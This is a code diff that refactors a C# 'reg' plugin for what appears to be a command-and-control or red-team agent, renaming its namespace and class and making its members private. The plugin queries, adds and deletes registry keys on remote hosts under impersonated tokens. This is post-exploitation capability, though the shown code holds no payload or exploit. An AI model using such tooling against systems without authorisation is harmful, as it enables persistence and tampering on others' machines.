@@ -4,23 +4,23 @@ using Agent.Utilities;
 using Microsoft.Win32;
 using System.Text;
 
-namespace reg
+namespace Agent
 {
-    public class Reg : IPlugin
+    public class Plugin : IPlugin
     {
         public string Name => "reg";
-        public IAgentConfig config { get; set; }
-        public IMessageManager messageManager { get; set; }
-        public ILogger logger { get; set; }
-        public ITokenManager tokenManager { get; set; }
-        public Reg(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager)
+        private IAgentConfig config { get; set; }
+        private IMessageManager messageManager { get; set; }
+        private ILogger logger { get; set; }
+        private ITokenManager tokenManager { get; set; }
+        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager)
         {
             this.messageManager = messageManager;
             this.config = config;
             this.logger = logger;
             this.tokenManager = tokenManager;
         }
-        public string NormalizeKey(string text)
+        private string NormalizeKey(string text)
         {
             Dictionary<string, string> dic = new Dictionary<string, string>()
             {
@@ -88,7 +88,7 @@ namespace reg
                 tokenManager.Revert();
             }
         }
-        string RegistryDelete(string keyPath, string keyName, string RemoteAddr, out bool error)
+        private string RegistryDelete(string keyPath, string keyName, string RemoteAddr, out bool error)
         {
             StringBuilder sb = new StringBuilder();
             ResponseResult rr = new ResponseResult();
@@ -144,7 +144,7 @@ namespace reg
             }
             return sb.ToString();
         }
-        string RegistryAdd(string KeyName, string keyPath, string KeyValue, string RemoteAddr, out bool error)
+        private string RegistryAdd(string KeyName, string keyPath, string KeyValue, string RemoteAddr, out bool error)
         {
             StringBuilder sb = new StringBuilder();
             RegistryKey rk;
@@ -196,7 +196,7 @@ namespace reg
             }
             return sb.ToString();
         }
-        string RegistryQuery(string keyPath, string RemoteAddr, out bool error)
+        private string RegistryQuery(string keyPath, string RemoteAddr, out bool error)
         {
             StringBuilder sb = new StringBuilder();
             error = false;
